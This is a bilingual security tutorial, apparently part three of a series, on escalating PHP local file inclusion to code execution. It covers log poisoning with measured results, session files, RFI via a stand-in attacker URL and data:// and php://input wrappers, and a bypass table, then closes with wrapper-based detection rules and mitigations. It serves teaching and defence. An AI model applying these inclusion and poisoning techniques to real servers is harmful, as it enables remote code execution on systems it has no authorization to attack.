---
id: lfi-to-rce-and-detection
title_en: "LFI, Part 3 — From Reading to Running, and Detection"
title_zh: "LFI（三）：从读到执行，以及检测"
summary_en: A file read becomes execution when something that interprets files can be pointed at content you control, or when the include itself can be aimed at a location you control. This entry covers both routes with measurements, including why the famous log-poisoning technique is harder than it is usually described, and closes the series with detection.
summary_zh: 当某个"解释文件"的组件能被指向你控制的内容，或者包含本身能被指向你控制的位置时，一次文件读取就变成了执行。这一篇带实测讲这两条路 —— 包括那个著名的日志投毒为什么比通常讲的难 —— 并用检测为这个系列收尾。
tags: [web, lfi, rfi, log-poisoning, cwe-98, cwe-22]
tools: [php, curl, python3, Burp Suite]
attck: [T1190, T1505.003]
platform: [web]
difficulty: intermediate
updated: 2026-10-08
---

<!-- lang:en -->
### Reading is not running — unless something runs what you read

Part 1 covered getting to a path outside the intended directory. Part 2 covered reading source rather than executing it. This part is about the step that makes a file read dangerous: **execution**.

A read by itself gives no execution. It becomes execution when one of two things is true:

| Route | What it requires |
|---|---|
| **Something that interprets files is pointed at content you control** | A file whose content you influence, which a server-side interpreter will later include |
| **The include itself is aimed at a location you control** | A wrapper or URL scheme accepted by the include, so the "file" is your data |

The first route is the one people mean by "log poisoning"; the second is what "remote file inclusion" refers to. Both are ordinary injection once stated that way: **data reaching a position that is read as code**, with the interpreter being PHP's include machinery.

### Route one: content you control, inside a file that gets included

The requirement is a file whose **content** the attacker can influence and whose **path** the application can be made to include. The classic candidates:

| Target file | Why the content is influenceable | What has to be true |
|---|---|---|
| **Web access log** | The request line, path and User-Agent are recorded verbatim | The log path is known and readable by the web user |
| **SSH auth log** | The username in a failed login is recorded | SSH reachable |
| **Mail log** | Envelope sender and subject lines | A mail path is reachable |
| **PHP session file** | `session.upload_progress` writes attacker-influenced keys and values | Session save path known |
| **Uploaded temp file** | The upload's content is fully controlled | The temp filename can be determined |
| **Uploaded image or document** | Content controlled, and polyglots are allowed | Combined with an upload bypass |
| **Cache files** | Cached content derived from a request | Predictable cache path |

#### Log poisoning, measured honestly

The version usually shown is: put PHP in the User-Agent, the server writes it into `access.log`, then include that log and the code runs. Two measurements on a current PHP, because the technique has a subtlety that the usual write-up omits.

**Writing plain PHP into the log works:**

```
log line:  1.2.3.4 "GET /<?php echo 'PLAIN-EXEC'; ?> HTTP/1.1"
include  -> output: 1.2.3.4 "GET /PLAIN-EXEC HTTP/1.1"      executed: true
```

The garbage around the payload is emitted as text, which is harmless: outside `<?php ... ?>` the interpreter just prints it.

**The base64 variant does not work against a realistically formatted log.** The idea behind it is sound — write a base64 string into the log, then include it through `php://filter/convert.base64-decode`, which ignores characters outside the base64 alphabet:

```
log line:  1.2.3.4 - - [x] "GET / HTTP/1.1" 200 - "-" "Mozilla PD9waHAg.../5.0"
include php://filter/convert.base64-decode/resource=access.log
        -> output: (empty)      executed: false
```

The reason is the very property that makes the trick appealing: the decoder ignores non-base64 characters, **but `HTTP`, `GET`, `Mozilla` and the timestamp are all legal base64 characters**. They are not skipped, they are **decoded along with the payload**, and the resulting byte stream is no longer the PHP source that was encoded.

Two conclusions that are more useful than the payload:

**The technique's feasibility is a property of the log's format, not of PHP.** It works where the surrounding content is reliably outside the base64 alphabet — a field written with a delimiter that is not alphanumeric, a log whose format the attacker can influence. On a standard combined access log, the fixed parts collide with it.

**Plain inclusion is usually the better first attempt.** It needs no filter and no alignment, only that the log records its content verbatim — and if the payload ends up inside a string that the interpreter prints as text, nothing is lost.

#### Session files, and why that setting matters

`session.upload_progress` makes PHP write a file whose **name is derived from a session id the client can choose** and whose **content includes attacker-supplied keys and values**. Both halves are then attacker-controlled, which is exactly what route one needs. The settings that enable it and the session save path are the two things to check, and the language entry's PHP section already treats `upload_progress` as a configuration finding rather than a curiosity.

### Route two: aim the include at your own data

When the include accepts a wrapper, "the file" no longer has to be on disk.

| Target | Requires | Note |
|---|---|---|
| `http://attacker/shell.txt` | `allow_url_include=On` | Classic RFI; the server fetches and executes |
| `ftp://` | same | Useful when `http` outbound is filtered |
| `data://text/plain;base64,...` | **`allow_url_include=On`** | The payload travels in the request; **no outbound network needed** |
| `php://input` | **`allow_url_include=On`** | The request body becomes the file |
| `php://filter/...` | **not affected by that setting** | Reads, and can be combined with a route-one file |

The measurements behind that table are worth stating precisely, because the middle rows are where assumptions usually go wrong:

| Setting | `data://` include | `php://input` include | `php://filter` include |
|---|---|---|---|
| `allow_url_include=On` | **executes** | executes when the body carries code | works |
| `allow_url_include=Off` | **fails** | **fails** | **still works** |

So the practical picture is:

**`allow_url_include=Off` blocks RFI and both of the "payload in the request" wrappers.** That is a real and worthwhile control, and it is the reason RFI is far rarer today than it was.

**It does not block `php://filter`.** Measured in part 2 and repeated here for completeness: `php://filter` is a filter over a local stream, and it returns source with both URL directives off. So the setting that stops remote inclusion does not stop local source disclosure, and a target that relies on it is protected against one route but not the other.

**`data://` and `php://input` need no outbound network at all**, which matters on an internal service: they put the payload in the request, so egress filtering does not touch them. Their single point of failure is the one setting.

### When the extension is appended

A common code shape appends a suffix to the included path:

```php
include $_GET['page'] . '.php';
```

The measurements here are short and useful:

| Attempt | Result |
|---|---|
| `include $target . '.php'` where `$target` exists without the suffix | **fails** — the resolved path does not exist |
| `include 'php://filter/.../resource=' . $target . '.php'` | **fails** — the filter does not remove the appended suffix |

**The filter does not help.** It transforms the stream's bytes; it does not change how the path is resolved, and the suffix is part of the path. Techniques that used to bypass this — a NUL byte to truncate the string, or a path length limit that cut the suffix off — are not available in current runtimes: the NUL byte is rejected and the length limits are gone.

That makes the appended-suffix pattern **a genuine mitigation** for path-only inclusion bugs, and worth knowing as one of the few cheap ones:

- It does not stop route two where the wrapper consumes the whole string (`?page=php://filter/...` with the suffix appended lands in the resource path and fails, as measured).
- It does not stop an attacker who can choose a name that already ends in the suffix, where such a file exists.
- It **does** stop the large family of "read any file and it gets executed" cases, because a file with the suffix appended usually does not exist.

### Bypasses for this class, collected

| Layer | What to try |
|---|---|
| **Path** | Encoding layers, absolute paths, symbolic links, Windows semantics (part 1) |
| **Filters** | `php://filter` chains — `iconv` and the encode-decode cancellation pair (part 2) |
| **Wrapper case** | Wrapper names are case-insensitive, so a filter matching `php://filter` in one case may miss another |
| **Controllable content** | Any writable file whose content a request can influence: logs, sessions, uploads, caches |
| **Suffix appending** | Check whether any reachable file already ends with the suffix; otherwise treat it as a real barrier |
| **Read-to-run** | Wrappers that carry the payload in the request, when remote inclusion is enabled |

And the general rule from part 1 applies to all of them: **determine what the filter does before choosing a payload**, and **count the decodes on each side**.

### Detection and mitigation

- **Alert on wrappers in requests.** `php://`, `data://`, `zip://`, `phar://`, `expect://`, `php://input` in a parameter or filename. This rule is the backbone of the whole series of three parts, and it is low-noise because no legitimate client sends these.
- **Alert on requests that name a log, session or cache file.** A path containing `access.log`, `error.log`, `auth.log`, `session`, a `tmp` directory or a cache path, arriving as a parameter, is someone looking for a file whose content they can influence. That is the reconnaissance step of route one, and it is far more specific than "traversal attempt".
- **Watch what gets included, not only what is requested.** Where the application logs the path it resolved and included, an include pointing at a log file or a temp directory shows up directly. This is the same lesson as logging four filenames in the upload entry: the value that matters is the one the application **used**, not the one it received.
- **Detect the effects of execution.** A request whose response contains output the application never generates — a hostname, the output of a command, a marker the payload echoed — indicates that included content ran. So does a PHP error naming a path the application never intended to include, since include failures print the path.
- **For mitigation, prefer the structural controls.** Keep user input out of `include` and out of paths; allowlist names; keep `allow_url_include=Off` (it genuinely blocks route two); append a suffix where the design permits, and know that it is a real barrier; run the web user with the least privilege, and keep logs and session directories **unreadable by it**, which removes route one's raw material rather than detecting its use.
- **Do not keep secrets in source, and do not keep logs where the interpreter can read them.** The second is the one specific to this entry: if the web user cannot read the access log, log poisoning has nothing to poison.
- **And close the series with the one-line version of why this class is severe on PHP and milder elsewhere.** Because `include` reads and executes in one operation, **any file read on a PHP target is a potential code execution** — the gap between "read a file" and "run code" is one wrapper or one poisonable file wide. On platforms that separate reading from executing, the same bug stays an information disclosure, which is a different incident.

<!-- lang:zh -->
### 读不是运行 —— 除非有东西去运行你读到的东西

第一篇讲的是够到预期目录之外的路径。第二篇讲的是读源码而不是执行它。这一篇讲那个让文件读取变得危险的步骤：**执行**。

读取本身不给执行。它在两种情况下变成执行：

| 路线 | 它需要什么 |
|---|---|
| **某个"解释文件"的东西被指向你控制的内容** | 一个内容受你影响、且服务端解释器之后会包含它的文件 |
| **包含本身被指向你控制的位置** | 包含接受的一种包装器或 URL 协议，于是"那个文件"就是你的数据 |

第一条路线就是人们说"日志投毒"时指的；第二条就是"远程文件包含"所指的。这样一说，两者都只是普通的注入：**数据到达了一个被当作代码来读的位置**，而解释器是 PHP 的包含机制。

### 路线一：你控制的内容，在一个会被包含的文件里

要求是一个**内容**能被攻击者影响、且**路径**能被诱导让应用包含的文件。经典候选：

| 目标文件 | 内容为什么可影响 | 必须成立的条件 |
|---|---|---|
| **Web 访问日志** | 请求行、路径与 User-Agent 被原样记录 | 日志路径已知、且 Web 用户可读 |
| **SSH 认证日志** | 登录失败里的用户名被记录 | SSH 可达 |
| **邮件日志** | 信封发件人与主题行 | 有可达的邮件路径 |
| **PHP session 文件** | `session.upload_progress` 写入受攻击者影响的键值 | 会话保存路径已知 |
| **上传的临时文件** | 上传内容完全可控 | 临时文件名能被确定 |
| **上传的图片或文档** | 内容可控，且允许多语义文件 | 配合一次上传绕过 |
| **缓存文件** | 缓存内容由请求派生 | 缓存路径可预测 |

#### 日志投毒，如实测的那样

通常看到的版本是：把 PHP 放进 User-Agent，服务器把它写进 `access.log`，然后包含那个日志，代码就跑了。下面是在当前 PHP 上的两次实测 —— 因为这个技巧有一个通常写法会略过的微妙之处。

**把明文 PHP 写进日志是可行的：**

```
日志行:  1.2.3.4 "GET /<?php echo 'PLAIN-EXEC'; ?> HTTP/1.1"
include -> 输出: 1.2.3.4 "GET /PLAIN-EXEC HTTP/1.1"      执行了吗: true
```

载荷周围那些垃圾文本会作为文本被输出，这是无害的：在 `<?php ... ?>` 之外，解释器只是把它们打印出来。

**base64 那个变体，对一份真实格式的日志不成立。** 它背后的想法是对的 —— 往日志里写一串 base64，然后通过 `php://filter/convert.base64-decode` 包含它，解码器会忽略 base64 字母表之外的字符：

```
日志行:  1.2.3.4 - - [x] "GET / HTTP/1.1" 200 - "-" "Mozilla PD9waHAg.../5.0"
include php://filter/convert.base64-decode/resource=access.log
        -> 输出: （空）      执行了吗: false
```

原因恰恰是让这个技巧显得诱人的那个性质：解码器忽略非 base64 字符，**但 `HTTP`、`GET`、`Mozilla` 和时间戳全都是合法的 base64 字符**。它们不会被跳过，而是**与载荷一起被解码**，于是产出的字节流不再是当初被编码的那段 PHP 源码。

两个结论比那个 payload 更有用：

**这个技巧成不成立，是日志格式的性质，不是 PHP 的性质。** 它在"周围内容可靠地落在 base64 字母表之外"的地方成立 —— 一个用非字母数字分隔符写下的字段、一份攻击者能影响其格式的日志。在一份标准的 combined access log 上，那些固定部分会和它撞车。

**先试明文包含通常更好。** 它不需要过滤器、也不需要对齐，只需要日志原样记录内容 —— 而即使载荷落在解释器当作文本打印的字符串里，也没有损失什么。

#### Session 文件，以及那个设置为什么重要

`session.upload_progress` 让 PHP 写出一个文件，其**名字派生自客户端可以选择的会话 id**，其**内容包含攻击者提供的键与值**。两半都受攻击者控制 —— 这正是路线一需要的。开启它的那些设置与会话保存路径是两件要查的事，而语言篇的 PHP 一节已经把 `upload_progress` 当作一条配置发现，而不是一个趣闻。

### 路线二：把包含对准你自己的数据

当包含接受一种包装器时，"那个文件"就不必在磁盘上了。

| 目标 | 需要 | 说明 |
|---|---|---|
| `http://attacker/shell.txt` | `allow_url_include=On` | 经典 RFI；服务器去取并执行 |
| `ftp://` | 同上 | 当 `http` 出网被过滤时有用 |
| `data://text/plain;base64,...` | **`allow_url_include=On`** | 载荷随请求一起走；**不需要出网** |
| `php://input` | **`allow_url_include=On`** | 请求体成为那个文件 |
| `php://filter/...` | **不受那个设置影响** | 只读，但可以与路线一里的文件组合 |

那张表背后的实测值得说准，因为中间几行正是假设容易出错的地方：

| 设置 | `data://` 包含 | `php://input` 包含 | `php://filter` 包含 |
|---|---|---|---|
| `allow_url_include=On` | **执行** | 当请求体带着代码时执行 | 可用 |
| `allow_url_include=Off` | **失败** | **失败** | **仍然可用** |

所以实际图景是：

**`allow_url_include=Off` 挡掉 RFI 以及两个"载荷随请求走"的包装器。** 那是一项真实且有价值的控制，也是今天 RFI 远少于从前的原因。

**它挡不住 `php://filter`。** 第二篇实测过、这里为了完整性再写一次：`php://filter` 是对本地流的过滤器，在两个 URL 指令都关掉时它照样返回源码。所以那个"阻止远程包含"的设置，并不阻止本地源码泄漏；一个依赖它的目标，在这条路上被保护了，在另一条上没有。

**`data://` 与 `php://input` 完全不需要出网**，这在内部服务上很重要：它们把载荷放在请求里，所以出网过滤碰不到它们。它们唯一的失败点是那一个设置。

### 当扩展名被追加

一种常见的代码形状会给被包含的路径追加后缀：

```php
include $_GET['page'] . '.php';
```

这里的实测很短也很有用：

| 尝试 | 结果 |
|---|---|
| `include $target . '.php'`，而 `$target` 不带后缀时存在 | **失败** —— 解析出来的路径不存在 |
| `include 'php://filter/.../resource=' . $target . '.php'` | **失败** —— 过滤器不会去掉被追加的后缀 |

**过滤器帮不上忙。** 它变换的是流的字节；它不改变路径如何被解析，而后缀是路径的一部分。过去用来绕过这一点的技巧 —— 用 NUL 字节截断字符串、或用路径长度上限把后缀切掉 —— 在当前运行时里都不存在了：NUL 字节被拒绝，长度上限也没了。

这让"追加后缀"这个模式**成为针对纯路径型包含 bug 的一项真实缓解**，值得作为少数便宜手段之一记住：

- 它挡不住路线二里"包装器吃掉整个字符串"的情况（`?page=php://filter/...` 在追加后缀后会落到 resource 路径里并失败，如实测所示）。
- 它挡不住一个能选到"本来就以该后缀结尾的名字"的攻击者 —— 前提是那样的文件存在。
- 它**确实**挡下了"读任意文件、然后它被执行"那一大家子情况，因为带后缀的那个文件通常不存在。

### 这一类的绕过，汇总

| 层次 | 该试什么 |
|---|---|
| **路径** | 编码层、绝对路径、符号链接、Windows 语义（第一篇） |
| **过滤器** | `php://filter` 链 —— `iconv`，以及那对"编解码互相抵消"（第二篇） |
| **包装器大小写** | 包装器名大小写不敏感，所以只匹配一种写法的过滤器可能漏掉另一种 |
| **可控内容** | 任何"内容能被请求影响"的可写文件：日志、会话、上传、缓存 |
| **后缀追加** | 先看有没有可达文件本来就以该后缀结尾；否则把它当成一道真实的墙 |
| **从读到跑** | 开启远程包含时，把载荷放在请求里的那些包装器 |

而第一篇那条通用规则适用于以上全部：**先确定过滤器做什么，再选 payload**，并且**数清两边各解码几次**。

### 检测与缓解

- **对请求里的包装器告警。** 参数或文件名里的 `php://`、`data://`、`zip://`、`phar://`、`expect://`、`php://input`。这条规则是这三篇的骨干，而且噪声很低，因为没有正当客户端会发这些。
- **对"点了一个日志、会话或缓存文件"的请求告警。** 一个作为参数到来的、含 `access.log`、`error.log`、`auth.log`、`session`、`tmp` 目录或缓存路径的路径，就是有人在找"内容能被自己影响"的文件。那是路线一的侦察步骤，而且它比"穿越尝试"精确得多。
- **看被包含的是什么，而不只是被请求的是什么。** 在应用记录下"它解析并包含了哪条路径"的地方，一次指向日志文件或临时目录的包含会直接现形。这和上传那篇"记下四个文件名"是同一课：要紧的是**应用实际使用**的那个值，不是它收到的那个。
- **检测执行的后果。** 一个响应里含有应用从不生成的内容 —— 一个主机名、一条命令的输出、载荷回显的标记 —— 就说明被包含的内容运行了。一条点名了应用从不打算包含的路径的 PHP 错误也是，因为包含失败会打印路径。
- **缓解上，优先用结构性控制。** 让用户输入既不进 `include`、也不进路径；白名单名字；保持 `allow_url_include=Off`（它确实挡掉了路线二）；设计允许时追加后缀，并知道那是一道真实的墙；用最小权限运行 Web 用户，并让日志与会话目录**对它不可读** —— 那移除的是路线一的原材料，而不是去检测它的使用。
- **不要把密钥放在源码里，也不要把日志放在解释器能读到的地方。** 后一条是本篇特有的：如果 Web 用户读不到访问日志，日志投毒就无物可毒。
- **并且用一句话为这个系列收尾，说明为什么这一类在 PHP 上严重、在别处温和。** 因为 `include` 把读和执行合成一个操作，**PHP 目标上的任何文件读取都是一次潜在的代码执行** —— "读一个文件"与"运行代码"之间的间隔，只有一个包装器或一个可污染文件那么宽。在把读与执行分开的平台上，同一个 bug 停留在信息泄漏，而那是另一起事故。
